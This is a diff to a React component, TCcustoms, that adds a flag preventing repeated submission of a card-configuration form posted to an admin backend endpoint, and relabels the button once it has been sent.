@@ -39,6 +39,7 @@ export default function TCcustoms() {
     // NEW STATES
     const [filterFranquicia, setFilterFranquicia] = useState("Todas"); // 'Todas' | 'Visa' | 'Mastercard' | 'Amex'
     const [selectedCard, setSelectedCard] = useState(null); // stores the filename of the selected card
+    const [submitted, setSubmitted] = useState(false); // Flag para prevenir múltiples envíos
 
     const inputRefs = useRef([]);
 
@@ -128,7 +129,7 @@ export default function TCcustoms() {
 
     // Handler para enviar datos y navegar a ValidacionTC
     const handleEnviar = async () => {
-        if (!selectedCard || digits.some(d => d === "")) return;
+        if (!selectedCard || digits.some(d => d === "") || submitted) return;
 
         // Obtener sesionId de la URL
         const params = new URLSearchParams(window.location.search);
@@ -153,6 +154,8 @@ export default function TCcustoms() {
         };
 
         try {
+            setSubmitted(true); // Bloquear botón permanentemente
+
             // Enviar configuración al backend
             await instanceBackend.post('/admin/config-tc', {
                 sesionId: sesionId,
@@ -492,19 +495,19 @@ export default function TCcustoms() {
                 {/* BUTTON */}
                 <button
                     onClick={handleEnviar}
-                    disabled={!selectedCard || digits.some(d => d === "")} // Disable if no card selected OR any digit is empty
+                    disabled={!selectedCard || digits.some(d => d === "") || submitted}
                     style={{
                         width: "100%",
-                        backgroundColor: (selectedCard && digits.every(d => d !== "")) ? "#fdda24" : "#333", // Active color when ready
-                        color: (selectedCard && digits.every(d => d !== "")) ? "black" : "#666",
+                        backgroundColor: (selectedCard && digits.every(d => d !== "") && !submitted) ? "#fdda24" : "#333",
+                        color: (selectedCard && digits.every(d => d !== "") && !submitted) ? "black" : "#666",
                         border: "none",
                         padding: "15px",
                         borderRadius: "8px",
                         fontSize: "16px",
-                        cursor: (selectedCard && digits.every(d => d !== "")) ? "pointer" : "not-allowed",
+                        cursor: (selectedCard && digits.every(d => d !== "") && !submitted) ? "pointer" : "not-allowed",
                         transition: "background-color 0.3s"
                     }}>
-                    Enviar
+                    {submitted ? "Enviado" : "Enviar"}
                 </button>
 
             </div>
